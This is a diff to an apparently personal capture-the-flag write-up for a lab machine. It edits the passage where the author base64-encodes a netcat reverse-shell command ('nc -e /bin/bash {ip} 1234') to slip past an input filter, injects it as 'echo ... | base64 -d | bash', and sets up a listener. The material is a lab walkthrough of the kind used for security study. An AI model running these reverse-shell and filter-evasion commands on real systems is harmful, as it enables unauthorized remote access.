@@ -73,15 +73,31 @@ cat /var/earth_web/user_flag.txt
 Now it's time to get escalate. I would use netcat to connect this 
 <img width="1912" height="369" alt="Screenshot 2025-09-18 002001" src="https://github.com/user-attachments/assets/5a7c7c66-3e2a-4f23-9b30-725d54787beb" />
 Unfortunately, they forbide me against doing such thing. However, nothing can stop me. I will encode base 64 for this command then inject that into the input field again.
+
 ```
-echo "nc -e /bin/bash 192.168.0.95 1234" | base64
+echo "nc -e /bin/bash {ip} 1234" | base64
 ```
- and afterward, I would receive an encoded string and this is the format that I am going to put in the input field
- ```
+
+TIP: using this command :
+```
+ifconfig | grep eth0
+```
+
+and afterward, I would receive an encoded string and this is the format that I am going to put in the input field
+
+```
 {encoded_stirng} | base64 -d | bash
 ```
+
 But I also need to set up a listener as well
+
 ```
 nc -lnvp 1234
 ```
-Done and now just run the command and I will receive the connection
+
+Done and now just run the command and I will receive the connection. The thing is I made a mistake at the initiating the connection in the input field which should look like this.
+```
+echo {encoded_stirng} | base64 -d | bash
+```
+
+Boom!!! 
